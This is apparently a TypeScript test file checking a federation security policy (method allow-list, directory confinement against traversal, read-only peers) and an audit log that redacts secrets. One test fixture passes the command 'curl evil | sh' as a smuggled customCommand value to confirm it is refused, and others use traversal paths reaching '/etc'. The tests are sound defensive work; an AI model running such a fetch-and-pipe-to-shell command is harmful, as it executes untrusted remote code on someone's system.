import { describe, it, expect, beforeEach } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { checkFederatedRequest, FEDERATED_METHODS } from '../../bin/lib/network/policy.js';
import { createAuditLog } from '../../bin/lib/network/audit.js';

// Path confinement resolves through `path`, whose separator and case rules are
// platform-specific — so the fixtures have to be too. Baking in Windows paths
// passed on Windows and failed on Linux, where `C:\projects\api` is one
// relative filename rather than a path inside a root.
const isWindows = process.platform === 'win32';
const root = isWindows ? 'C:\\projects' : '/home/dev/src';
const inside = isWindows ? 'C:\\projects\\api' : '/home/dev/src/api';
const outside = isWindows ? 'C:\\Windows\\System32' : '/etc';
const traversal = isWindows ? 'C:\\projects\\..\\Windows' : '/home/dev/src/../../etc';
const sibling = isWindows ? 'C:\\projects-evil\\x' : '/home/dev/src-evil/x';

const devDirs = [root];

describe('federated capability policy', () => {
  it('allows the read-only methods a fleet view needs', () => {
    for (const method of ['session.snapshot', 'node.info', 'events.subscribe']) {
      expect(checkFederatedRequest({ method, params: {}, devDirs }).allowed).toBe(true);
    }
  });

  it('refuses a method that is not on the federated list', () => {
    // Allow-list, not deny-list: a method added later is refused until someone
    // decides it is safe, rather than exposed until someone notices.
    const verdict = checkFederatedRequest({ method: 'node.shutdown', params: {}, devDirs });
    expect(verdict.allowed).toBe(false);
    expect(verdict.reason).toMatch(/not available over federation/i);
  });

  it('refuses customCommand outright', () => {
    // The existing /ws proxy already refuses to forward this; a control channel
    // must not be the way around that.
    const verdict = checkFederatedRequest({
      method: 'pane.create',
      params: { workspaceId: 'w1', cwd: inside, customCommand: 'curl evil | sh' },
      devDirs,
    });
    expect(verdict.allowed).toBe(false);
    expect(verdict.reason).toMatch(/customCommand/);
  });

  it('confines pane creation to the configured dev directories', () => {
    const within = checkFederatedRequest({
      method: 'pane.create',
      params: { workspaceId: 'w1', cwd: inside },
      devDirs,
    });
    expect(within.allowed).toBe(true);

    const beyond = checkFederatedRequest({
      method: 'pane.create',
      params: { workspaceId: 'w1', cwd: outside },
      devDirs,
    });
    expect(beyond.allowed).toBe(false);
    expect(beyond.reason).toMatch(/outside/i);
  });

  it('is not fooled by traversal out of a dev directory', () => {
    const verdict = checkFederatedRequest({
      method: 'pane.create',
      params: { workspaceId: 'w1', cwd: traversal },
      devDirs,
    });
    expect(verdict.allowed).toBe(false);
  });

  it('is not fooled by a sibling directory sharing a prefix', () => {
    // A sibling sharing a prefix ("…-evil" beside "…") starts with the root as
    // a string but is nowhere inside it. A naive startsWith lets it through.
    const verdict = checkFederatedRequest({
      method: 'pane.create',
      params: { workspaceId: 'w1', cwd: sibling },
      devDirs,
    });
    expect(verdict.allowed).toBe(false);
  });

  it('refuses pane creation when no dev directories are configured', () => {
    // Fail closed. An empty list means "nothing is permitted", never
    // "everything is".
    const verdict = checkFederatedRequest({
      method: 'pane.create',
      params: { workspaceId: 'w1', cwd: inside },
      devDirs: [],
    });
    expect(verdict.allowed).toBe(false);
  });

  it('refuses every write when the peer is read-only', () => {
    const readOnly = { readOnly: true, devDirs };
    expect(
      checkFederatedRequest({ method: 'session.snapshot', params: {}, ...readOnly }).allowed
    ).toBe(true);
    for (const method of ['pane.create', 'pane.input', 'pane.update', 'workspace.create']) {
      const verdict = checkFederatedRequest({ method, params: { cwd: root }, ...readOnly });
      expect(verdict.allowed, method).toBe(false);
      expect(verdict.reason).toMatch(/read-only/i);
    }
  });

  it('names every federated method as either read or write', () => {
    // A method with no classification would fall through the read-only check.
    for (const [method, spec] of Object.entries(FEDERATED_METHODS)) {
      expect(['read', 'write'], method).toContain(spec.kind);
    }
  });
});

describe('audit log', () => {
  let logPath: string;
  beforeEach(() => {
    logPath = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'spaces-audit-')), 'federation.log');
  });

  it('records accepted and rejected connections as one JSON object per line', () => {
    const audit = createAuditLog({ path: logPath, now: () => 1_700_000_000_000 });
    audit.record({ event: 'connect.accepted', nodeId: 'gpu', keyId: 'AAAA', address: '100.64.0.1' });
    audit.record({ event: 'connect.rejected', nodeId: 'who', reason: 'unknown node' });

    const lines = fs.readFileSync(logPath, 'utf-8').trim().split('\n');
    expect(lines).toHaveLength(2);
    const first = JSON.parse(lines[0]);
    expect(first.event).toBe('connect.accepted');
    expect(first.nodeId).toBe('gpu');
    expect(first.ts).toBe('2023-11-14T22:13:20.000Z');
    expect(JSON.parse(lines[1]).reason).toBe('unknown node');
  });

  it('never writes a secret it was handed', () => {
    // Belt and braces: an audit log is exactly the file someone copies into a
    // bug report.
    const audit = createAuditLog({ path: logPath });
    audit.record({
      event: 'connect.accepted',
      nodeId: 'gpu',
      apiKey: 'spk_live_secret',
      signature: 'abcd',
      privateKeyPem: 'PRIVATE',
    });
    const written = fs.readFileSync(logPath, 'utf-8');
    expect(written).not.toContain('spk_live_secret');
    expect(written).not.toContain('PRIVATE');
    expect(written).toContain('gpu');
  });

  it('survives an unwritable path rather than taking the listener down', () => {
    const audit = createAuditLog({ path: path.join(logPath, 'nested', 'deep.log') });
    expect(() => audit.record({ event: 'connect.accepted' })).not.toThrow();
  });
});
